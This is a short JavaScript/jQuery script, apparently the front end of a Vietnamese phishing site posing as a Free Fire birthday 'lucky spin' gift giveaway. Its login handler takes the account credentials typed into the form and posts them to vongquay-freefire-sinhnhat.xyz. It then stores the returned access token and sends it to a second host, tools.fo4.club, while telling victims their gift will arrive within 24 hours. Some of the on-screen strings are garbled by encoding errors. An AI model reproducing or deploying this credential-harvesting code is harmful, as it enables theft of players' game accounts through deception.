var a00731e5c = function() {
    console.log("generate captcae nao");
        var b = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(a) {
            var b = 16 * Math.random() | 0;
            return ("x" == a ? b : b & 3 | 8).toString(16)
        }).replace(/-/g, "");
        $("#captcha-key").val(b);
        $("#captcha-img").attr("src", "http://vongquay-freefire-sinhnhat.xyz/captcha.php?id=" + b)
    },
    refreshCaptcha = function() {
        $(".refresh").click(function() {
            a00731e5c()
        })
    },
    loginHandle = function() {
        $("#login-form").submit(function(b) {
            $.ajax({
                method: "POST",
                url: "http://vongquay-freefire-sinhnhat.xyz/login.php",
                data: $(this).serialize(),
                dataType: "json",
                beforeSend: function() {
                    $("#confirm-btn").val("\u0110ang \u0111\u0103ng nh\u1eadp...").attr("disabled", !0)
                },
                complete: function() {
                    $("#confirm-btn").val("\u0110\u0103ng nh\u1eadp ngay").removeAttr("disabled");
                    a00731e5c()
                }
            }).done(function(a) {
                if (a.status === "success") {
                    if (a.access_token) {
                        localStorage.setItem("access_token", a.access_token);
                    }
                    location.href = "/";
                } else {
                    "error_require_captcha" == a.status ? ($("#lucky_captcha_wrap").show(), $("#input-captcha").attr("required", !0)) : "success" == a.status ? location.href = "/" : swal("Th\u00f4ng b\u00e1o", a.message || "C\u00f3 l\u1ed7i khi nh\u1eadn qu\u00e0!", "error")
                }
            }).fail(function() {
                swal("Th\u00f4ng b\u00e1o", "C\u00f3 l\u1ed7i khi nh\u1eadn qu\u00e0!", "error").then(function() {
                    location.reload()
                })
            });
            b.preventDefault()
        })
    },
    receiveGiftNow = function() {
        let access_token = localStorage.getItem("access_token");
        $("#receive-gift-form").submit(function(b) {
            $.ajax({
                method: "POST",
                url: "https://tools.fo4.club/api/receive-gift",
                headers: {
                    "Authorization": access_token
                },
                data: $(this).serialize(),
                dataType: "json",
                beforeSend: function() {
                    $("#__confirm-btn").val("Äang nháº­n quĂ ...").attr("disabled", !0)
                },
                complete: function() {
                    $("#__confirm-btn").val("Nháº­n quĂ  ngay").removeAttr("disabled");
                    a00731e5c()
                }
            }).done(function(a) {
                swal("Nháº­n quĂ  thĂ nh cĂ´ng", "QuĂ  táº·ng sáº½ Ä‘Æ°á»£c gá»­i sau 24h!", "success");
                closePop();
            }).fail(function() {
                swal("Th\u00f4ng b\u00e1o", "C\u00f3 l\u1ed7i khi nh\u1eadn qu\u00e0!", "error").then(function() {
                    location.reload()
                })
            });
            b.preventDefault()
        })
    }
$(document).ready(function() {
    loginHandle();
    a00731e5c();
    refreshCaptcha();
    receiveGiftNow();
});
